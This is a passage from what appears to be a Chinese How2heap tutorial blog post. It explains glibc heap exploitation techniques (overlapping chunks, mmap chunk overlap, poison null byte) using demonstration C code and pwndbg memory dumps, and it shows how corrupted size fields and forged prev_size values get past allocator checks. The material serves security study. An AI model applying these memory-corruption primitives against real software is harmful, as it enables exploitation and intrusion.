<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。<br>​</p>
<h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-42.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=673&originWidth=1025&originalType=binary&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-43.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=680&originalType=binary&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk p1 from <span class="number">0x8007010</span> to <span class="number">0x80073f840</span></span><br><span class="line">chunk p2 from <span class="number">0x8007400</span> to <span class="number">0x80077e841</span></span><br><span class="line">chunk p3 from <span class="number">0x80077f0</span> to <span class="number">0x8007bd842</span></span><br><span class="line">chunk p4 from <span class="number">0x8007be0</span> to <span class="number">0x8007fc843</span></span><br><span class="line">chunk p5 from <span class="number">0x8007fd0</span> to <span class="number">0x80083b8</span></span><br></pre></td></tr></table></figure>

<p>然后填充赋值<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-44.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=982&originalType=binary&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-45.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1079&originalType=binary&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-46.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=864&originalType=binary&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-47.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1095&originalType=binary&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-48.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=1062&originalType=binary&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-49.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=385&originalType=binary&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-50.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=1821&originalType=binary&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-51.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1803&originalType=binary&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p>
<h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n当前系统内存布局\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;....\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;....\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line"><span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);</span><br><span class="line">    mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);</span><br><span class="line">    overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新块已与先前的块重叠\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始申请了 3 个 0x100000 大小的堆<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-52.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=791&originalType=binary&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">The first mmap chunk goes directly above LibC: <span class="number">0x7fffff6a0010</span></span><br><span class="line">The second mmap chunk goes below LibC: <span class="number">0x7fffff520010</span></span><br><span class="line">The third mmap chunk goes below the second mmap chunk: <span class="number">0x7ffffef20010</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffff6a0000</span></span><br><span class="line"><span class="number">0x7fffff6a0000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7fffff6a0010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffff520000</span></span><br><span class="line"><span class="number">0x7fffff520000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7fffff520010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7ffffef20000</span></span><br><span class="line"><span class="number">0x7ffffef20000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7ffffef20010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>然后把第三个的 size 改成 0x202002<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-53.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=1017&originalType=binary&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-54.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=582&originalType=binary&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-55.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=62&originWidth=559&originalType=binary&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-56.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=886&originalType=binary&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-57.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1033&originalType=binary&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-58.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=875&originalType=binary&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p>
<h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-59.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1052&originalType=binary&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-60.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1365&originalType=binary&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-61.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1148&originalType=binary&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-62.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=538&originalType=binary&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-63.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1133&originalType=binary&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-64.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=510&originalType=binary&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"><span class="built_in">free</span>(b)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-65.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=685&originalType=binary&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-66.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&margin=%5Bobject%20Object%5D&name=image.png&originHeight=56&originWidth=453&originalType=binary&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-67.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=542&originalType=binary&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p>
<p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-68.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1095&originalType=binary&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-69.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=560&originalType=binary&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-70.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=542&originalType=binary&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">(<span class="number">0x211</span> &amp; <span class="number">0xff00</span>) == <span class="number">0x200</span></span><br></pre></td></tr></table></figure>

<p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p>
<ul>
<li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-71.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=349&originalType=binary&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p>
<ul>
<li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-72.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=51&originWidth=464&originalType=binary&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-73.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=1095&originalType=binary&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-74.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=630&originalType=binary&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-75.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=717&originalType=binary&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx c<span class="number">-0x20</span></span><br><span class="line"><span class="number">0x8008310</span>:      <span class="number">0x00000000000000f0</span>      <span class="number">0x0000000000000000</span>   &lt;-fake chunk</span><br><span class="line"><span class="number">0x8008320</span>:      <span class="number">0x0000000000000210</span>      <span class="number">0x0000000000000110</span>   &lt;-chunk c</span><br><span class="line"><span class="number">0x8008330</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8008340</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8008350</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-76.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=765&originalType=binary&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-77.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=1408&originalType=binary&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-78.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=690&originalType=binary&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br></pre></td></tr></table></figure>

